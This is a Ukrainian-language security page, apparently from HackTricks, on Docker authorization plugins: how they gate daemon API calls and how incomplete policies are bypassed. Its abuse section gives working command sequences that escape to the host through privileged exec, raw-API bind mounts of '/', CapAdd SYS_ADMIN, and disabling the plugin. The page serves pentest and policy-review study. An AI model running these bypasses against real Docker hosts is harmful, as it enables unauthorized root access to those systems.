# Плагіни авторизації Runtime

## Огляд

Плагіни авторизації Runtime — це додатковий рівень політик, який визначає, чи може caller виконати певну дію daemon. Docker — класичний приклад. За замовчуванням будь-хто, хто може взаємодіяти з Docker daemon, фактично отримує широкий контроль над ним. Плагіни авторизації намагаються звузити цю модель, аналізуючи автентифікованого користувача та запитану API-операцію, а потім дозволяючи або забороняючи запит відповідно до політики.

Ця тема заслуговує на окрему сторінку, оскільки вона змінює модель exploitation, коли attacker уже має доступ до Docker API або до користувача в групі `docker`. У таких середовищах питання вже не лише в тому, «чи можу я звернутися до daemon?», а й у тому, «чи захищений daemon authorization layer, і якщо так, чи можна обійти цей layer через необроблені endpoints, слабкий JSON parsing або permissions на керування плагінами?»

## Робота

Коли запит надходить до Docker daemon, authorization subsystem може передати контекст запиту одному або кільком встановленим плагінам. Плагін бачить identity автентифікованого користувача, деталі запиту, вибрані headers, а також частини body запиту або відповіді, якщо content type є придатним. Кілька плагінів можна об'єднати в chain, і доступ надається лише тоді, коли всі плагіни дозволяють запит.

Ця модель здається надійною, але її безпека повністю залежить від того, наскільки повно policy author зрозумів API. Плагін, який блокує `docker run --privileged`, але ігнорує `docker exec`, пропускає альтернативні JSON keys, наприклад top-level `Binds`, або дозволяє plugin administration, може створити хибне відчуття обмеження, водночас залишаючи відкритими прямі шляхи до privilege escalation.

## Поширені цілі для плагінів

Важливі області для policy review:

- endpoints створення контейнерів
- поля `HostConfig`, такі як `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` та options для спільного використання namespaces
- поведінка `docker exec`
- endpoints керування плагінами
- будь-який endpoint, який може опосередковано запускати runtime actions за межами передбаченої policy model

Історично такі приклади, як `authz` plugin від Twistlock і прості educational plugins на кшталт `authobot`, спрощували вивчення цієї моделі, оскільки їхні policy files і code paths демонстрували, як насправді реалізовано зіставлення endpoint-to-action. Для assessment work важливо, щоб policy author розумів повний API surface, а не лише найпомітніші CLI commands.

## Зловживання

Перша мета — з'ясувати, що саме блокується. Якщо daemon забороняє дію, повідомлення про помилку часто leak назву плагіна, що допомагає визначити, який саме control використовується:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Якщо вам потрібне ширше профілювання endpoint, корисними будуть такі інструменти, як `docker_auth_profiler`, оскільки вони автоматизують рутинне завдання перевірки того, які маршрути API та структури JSON насправді дозволені плагіном.

Якщо середовище використовує custom plugin і ви можете взаємодіяти з API, перелічіть, які поля об’єктів насправді фільтруються:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ці перевірки важливі, оскільки багато помилок авторизації є специфічними для полів, а не для концепцій. Плагін може відхилити шаблон CLI, не блокуючи повністю еквівалентну структуру API.

### Повний приклад: `docker exec` додає привілеї після створення контейнера

Політику, яка блокує створення привілейованих контейнерів, але дозволяє створення unconfined-контейнерів разом із `docker exec`, усе ще можна обійти:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Якщо daemon приймає другий крок, користувач відновив привілейований інтерактивний процес усередині container, який, на думку автора політики, мав бути обмеженим.

### Повний приклад: Bind Mount через Raw API

Деякі flawed policies перевіряють лише одну JSON-форму. Якщо bind mount кореневої файлової системи не блокується послідовно, host усе ще можна змонтувати:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Та сама ідея також може зустрічатися в `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Впливом є повний вихід до файлової системи хоста. Цікава деталь полягає в тому, що обхід виникає через неповне охоплення політикою, а не через помилку ядра.

### Повний приклад: неперевірений атрибут capability

Якщо політика забуває фільтрувати атрибут, пов’язаний із capability, атакер може створити контейнер, який повторно отримує небезпечну capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Коли присутня `CAP_SYS_ADMIN` або аналогічна потужна capability, стають доступними багато технік breakout, описаних у [capabilities.md](protections/capabilities.md) і [privileged-containers.md](privileged-containers.md).

### Повний приклад: вимкнення плагіна

Якщо дозволені операції керування плагінами, найчистішим bypass може бути повне вимкнення контролю:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Це збій політики на рівні control-plane. Рівень авторизації існує, але користувач, якого він мав обмежувати, усе ще має дозвіл його вимкнути.

## Перевірки

Ці команди призначені для визначення того, чи існує рівень політик і чи є він повним або поверхневим.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Що тут цікаво:

- Повідомлення про відмову, які містять назву плагіна, підтверджують наявність authorization layer і часто розкривають точну реалізацію.
- Список плагінів, доступний атакувальнику, може бути достатнім, щоб з'ясувати, чи можливі операції вимкнення або переналаштування.
- Політику, яка блокує лише очевидні CLI-дії, але не необроблені API-запити, слід вважати такою, що допускає обхід, доки не доведено протилежне.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Не ввімкнено за замовчуванням | Доступ до daemon фактично є безальтернативним, якщо не налаштовано authorization plugin | неповна політика плагіна, blacklists замість allowlists, дозвіл керування плагінами, blind spots на рівні полів |
| Podman | Немає поширеного прямого еквівалента | Podman зазвичай більше покладається на Unix permissions, rootless execution і рішення щодо відкриття API, ніж на authz plugins у стилі Docker | широке відкриття rootful Podman API, слабкі permissions для socket |
| containerd / CRI-O | Інша модель керування | Ці runtimes зазвичай покладаються на permissions для socket, межі довіри до node та controls оркестратора вищого рівня, а не на Docker authz plugins | монтування socket у workloads, слабкі припущення щодо локальної довіри до node |
| Kubernetes | Використовує authn/authz на рівнях API-server і kubelet, а не Docker authz plugins | Cluster RBAC і admission controls є основним рівнем політики | надто широкі RBAC-права, слабка admission policy, пряме відкриття kubelet або runtime API |

{{#include ../../../banners/hacktricks-training.md}}
